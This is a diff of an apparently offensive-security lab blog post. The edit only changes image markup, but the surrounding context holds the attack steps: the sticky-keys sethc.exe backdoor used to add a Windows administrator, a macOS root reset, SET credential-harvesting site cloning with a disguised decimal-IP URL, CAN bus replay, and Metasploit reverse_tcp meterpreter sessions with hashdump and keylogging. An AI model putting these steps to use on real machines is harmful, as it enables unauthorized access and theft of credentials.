@@ -47,17 +47,25 @@ Hands-on : Reset the password and create an administrator user on any windows co
 Use f2/DEL/f12 to boot from Windows install disk.
 Click **Troubleshoot**. Click **Command Prompt**.
 
-![https://i.imgur.com/dxLMnM8.png](https://i.imgur.com/dxLMnM8.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/dxLMnM8.png" alt="blog_image" />
+</div>
 
 Click on repair your computer for the windows 10 iso for exemple
 
-![https://i.imgur.com/SHITsos.png](https://i.imgur.com/SHITsos.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/SHITsos.png" alt="blog_image" />
+</div>
 
 Then troubleshoot
 
-![https://i.imgur.com/uCfBN3g.png](https://i.imgur.com/uCfBN3g.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/uCfBN3g.png" alt="blog_image" />
+</div>
 
-![https://i.imgur.com/Ktr1bQq.png](https://i.imgur.com/Ktr1bQq.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/Ktr1bQq.png" alt="blog_image" />
+</div>
 
 Then finally command prompt
 
@@ -66,16 +74,22 @@ In the CMD window, type these commands:
  copy sethc.exe sethc_old.exe
 copy cmd.exe sethc.exe**
 
-![https://i.imgur.com/XXwAgTM.png](https://i.imgur.com/XXwAgTM.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/XXwAgTM.png" alt="blog_image" />
+</div>
 
-![https://i.imgur.com/SJrRNqF.png](https://i.imgur.com/SJrRNqF.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/SJrRNqF.png" alt="blog_image" />
+</div>
 
 Now instead of having this popup for the shifts key you will have a command prompt !
 
 Restart computer. At the login screen where you enter your
 password, press the **Shift** key five times. CMD window appears.
 
-![https://i.imgur.com/oyQNcEN.png](https://i.imgur.com/oyQNcEN.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/oyQNcEN.png" alt="blog_image" />
+</div>
 
 To change your existing password, type:
 **net user [ironman][jarvis]**
@@ -84,7 +98,9 @@ To add a new user and promote to Administrator:
 **net user [ironman][jarvis] /add
 net localgroup administrators ironman /add**
 
-![https://i.imgur.com/rnJlpeZ.png](https://i.imgur.com/rnJlpeZ.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/rnJlpeZ.png" alt="blog_image" />
+</div>
 
 **If you want to protect your computer for this attack please do this :**
 
@@ -101,11 +117,15 @@ Hands-on : Exact same thing but this time with macOS
 /sbin/mount -uw /
 launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist**
 
-![https://i.imgur.com/gxkzcL8.png](https://i.imgur.com/gxkzcL8.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/gxkzcL8.png" alt="blog_image" />
+</div>
 
 **passwd**
 
-![https://i.imgur.com/X0Pi6c5.png](https://i.imgur.com/X0Pi6c5.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/X0Pi6c5.png" alt="blog_image" />
+</div>
 
 • Enter a new ‘root’ password, twice
 **exit**
@@ -172,13 +192,19 @@ Network for the lab (private host)
 
 **10.0.3.X / 255.255.255.0**
 
-![https://i.imgur.com/PAL0wzb.png](https://i.imgur.com/PAL0wzb.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/PAL0wzb.png" alt="blog_image" />
+</div>
 
-![https://i.imgur.com/EHkd3k0.png](https://i.imgur.com/EHkd3k0.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/EHkd3k0.png" alt="blog_image" />
+</div>
 
 Now our second network adapter for update the VM/Kali
 
-![https://i.imgur.com/1coB78k.png](https://i.imgur.com/1coB78k.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/1coB78k.png" alt="blog_image" />
+</div>
 
 **Social engineering attack**
 
@@ -192,49 +218,71 @@ Now our second network adapter for update the VM/Kali
 
 **Fist attack : Site cloner with credentials stealing**
 
-![https://i.imgur.com/hq1o76P.png](https://i.imgur.com/hq1o76P.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/hq1o76P.png" alt="blog_image" />
+</div>
 
 Fist launch SET
 
-![https://i.imgur.com/18VC0dB.png](https://i.imgur.com/18VC0dB.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/18VC0dB.png" alt="blog_image" />
+</div>
 
 - Type 1 for the social engineering attack
 
-![https://i.imgur.com/3kt43UT.png](https://i.imgur.com/3kt43UT.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/3kt43UT.png" alt="blog_image" />
+</div>
 
 - Type 2 for the website attack
 
-![https://i.imgur.com/bPp3Slf.png](https://i.imgur.com/bPp3Slf.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/bPp3Slf.png" alt="blog_image" />
+</div>
 
 - Then select the third for the credentials haverster attack method
 
-![https://i.imgur.com/XcDAMLr.png](https://i.imgur.com/XcDAMLr.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/XcDAMLr.png" alt="blog_image" />
+</div>
 
 - Select the site cloner for the perfect illusion
 
-![https://i.imgur.com/Ajr9Awx.png](https://i.imgur.com/Ajr9Awx.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/Ajr9Awx.png" alt="blog_image" />
+</div>
 
 - Now enter you local IP of your computer of what ever you may need
 
-![https://i.imgur.com/MsQm1yw.png](https://i.imgur.com/MsQm1yw.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/MsQm1yw.png" alt="blog_image" />
+</div>
 
 - Enter the website that you want to replicate
 
-![https://i.imgur.com/IEG6vCs.png](https://i.imgur.com/IEG6vCs.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/IEG6vCs.png" alt="blog_image" />
+</div>
 
 - And its done ! you just need to wait now.
 
-![https://i.imgur.com/l3gZ59f.png](https://i.imgur.com/l3gZ59f.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/l3gZ59f.png" alt="blog_image" />
+</div>
 
 - Once you are done with this you can close the program and it will generate a report
 
-![https://i.imgur.com/XHikJcz.png](https://i.imgur.com/XHikJcz.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/XHikJcz.png" alt="blog_image" />
+</div>
 
 You can see the email and pass !
 
 **Now we are gonna change the url of the payload**
 
-![https://i.imgur.com/nA3uzbD.png](https://i.imgur.com/nA3uzbD.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/nA3uzbD.png" alt="blog_image" />
+</div>
 
 If we go to our windows 10 VM and we type the IP of the Kali VM you can see the payload, the payload with this address is not very effective this way.
 
@@ -242,7 +290,9 @@ If we convert our payload IP (Kali VM) into decimal we have this result : 167774
 
 And if we type this in the url (http://167774592)
 
-![https://i.imgur.com/dXyQpEH.png](https://i.imgur.com/dXyQpEH.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/dXyQpEH.png" alt="blog_image" />
+</div>
 
 It redirect in our payload address
 
@@ -266,7 +316,9 @@ Now you can download the **ICSim tools** in github
 
 **End result**
 
-![https://i.imgur.com/cZePD3m.png](https://i.imgur.com/cZePD3m.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/cZePD3m.png" alt="blog_image" />
+</div>
 
 **1 Start the virtual CAN network :**
 
@@ -289,7 +341,9 @@ Now you can download the **ICSim tools** in github
 cd Desktop/ICSim
 ./controls vcan0
 
-![https://i.imgur.com/7E3reRI.png](https://i.imgur.com/7E3reRI.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/7E3reRI.png" alt="blog_image" />
+</div>
 
 You can close, accelerate, open door everything.
 
@@ -306,13 +360,17 @@ You can close, accelerate, open door everything.
 - ls
 - [candump-file].log
 
-![https://i.imgur.com/c7IEFH6.png](https://i.imgur.com/c7IEFH6.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/c7IEFH6.png" alt="blog_image" />
+</div>
 
 **And now you can use this attack with :**
 
 - canplayer -I [candump-file].log vcan0
 
-![https://i.imgur.com/1Opw3wO.png](https://i.imgur.com/1Opw3wO.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/1Opw3wO.png" alt="blog_image" />
+</div>
 
 - [https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b](https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b) (proof of concept)
 
@@ -326,21 +384,29 @@ You can close, accelerate, open door everything.
   - **-f is for the file extension (exe)**
   - **-o is for the output where the file is going to be created with the name of course.**
 
-![https://i.imgur.com/QK83xE3.png](https://i.imgur.com/QK83xE3.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/QK83xE3.png" alt="blog_image" />
+</div>
 
 - **Now copy the payload on the var/www/ repertory**
 
-![https://i.imgur.com/iUkmSKA.png](https://i.imgur.com/iUkmSKA.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/iUkmSKA.png" alt="blog_image" />
+</div>
 
 - Then add privilege with the following command :
 
-![https://i.imgur.com/Zzx1wBd.png](https://i.imgur.com/Zzx1wBd.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/Zzx1wBd.png" alt="blog_image" />
+</div>
 
 - Finally you can start the apache service with :
 
 **Now you can go to your windows 7 machine and type the ip of the attacker machine in your brower**
 
-![https://i.imgur.com/3Zr72s1.png](https://i.imgur.com/3Zr72s1.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/3Zr72s1.png" alt="blog_image" />
+</div>
 
 **Now go back to the msf console and type the following commands :**
 
@@ -350,23 +416,31 @@ You can close, accelerate, open door everything.
 
 - **Now you can donwload and execute the infected file on the windows 7 machine.**
 
-![https://i.imgur.com/6YDASs1.png](https://i.imgur.com/6YDASs1.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/6YDASs1.png" alt="blog_image" />
+</div>
 
 Click on the check box if you can't download the exe
 
 **If everything is correct you will see this**
 
-![https://i.imgur.com/iGF17Hv.png](https://i.imgur.com/iGF17Hv.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/iGF17Hv.png" alt="blog_image" />
+</div>
 
 **Now the spicy part, exploit the victim with meterpreter**
 
-![https://i.imgur.com/QZaBoos.png](https://i.imgur.com/QZaBoos.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/QZaBoos.png" alt="blog_image" />
+</div>
 
 - First, create a session with the victim computer with :
 
 **You can run the following command to optain the hash and the username of the machine**
 
-![https://i.imgur.com/Z5oY5eS.png](https://i.imgur.com/Z5oY5eS.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/Z5oY5eS.png" alt="blog_image" />
+</div>
 
 - **getuid > optain the user of the session**
 - **run hashdump > optain the password hash of the user**
@@ -375,31 +449,43 @@ Click on the check box if you can't download the exe
 
 **Elevate privileges on windows 7**
 
-![https://i.imgur.com/PycwRxe.png](https://i.imgur.com/PycwRxe.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/PycwRxe.png" alt="blog_image" />
+</div>
 
 - First, you can type "**background**" to go back to the msf5 console then :
 
-![https://i.imgur.com/t8noPAI.png](https://i.imgur.com/t8noPAI.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/t8noPAI.png" alt="blog_image" />
+</div>
 
 - **set payload windows/meterpreter/reverse_tcp**
 
-![https://i.imgur.com/l8yE6p8.png](https://i.imgur.com/l8yE6p8.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/l8yE6p8.png" alt="blog_image" />
+</div>
 
 **You are now successfully administrator of the victim pc**
 
 **Forth attack : create a payload to infect an windows 10 machine**
 
-![https://i.imgur.com/yPf9ED2.png](https://i.imgur.com/yPf9ED2.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/yPf9ED2.png" alt="blog_image" />
+</div>
 
 Same ad before, you need to copy this exe file to you var/www/shared folder
 
 and of course use chmod to change the privilege.
 
-![https://i.imgur.com/uyxAb6Q.png](https://i.imgur.com/uyxAb6Q.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/uyxAb6Q.png" alt="blog_image" />
+</div>
 
 - **use exploit/multi/handler**
 
-![https://i.imgur.com/w8shQr4.png](https://i.imgur.com/w8shQr4.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/w8shQr4.png" alt="blog_image" />
+</div>
 
 Now you can open the exe file on your windows 10 machine and voila ! you have a session open with the infected machine.
 
@@ -407,14 +493,18 @@ Now you can open the exe file on your windows 10 machine and voila ! you have a 
 
 - screenshot
 
-![https://i.imgur.com/uwZDTeO.png](https://i.imgur.com/uwZDTeO.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/uwZDTeO.png" alt="blog_image" />
+</div>
 
 Scan the keystrokes on a windows machine
 
 - keyscan_start
 - keyscan_dump
 
-![https://i.imgur.com/H1WpIvB.png](https://i.imgur.com/H1WpIvB.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/H1WpIvB.png" alt="blog_image" />
+</div>
 
 **Problems with password**
 
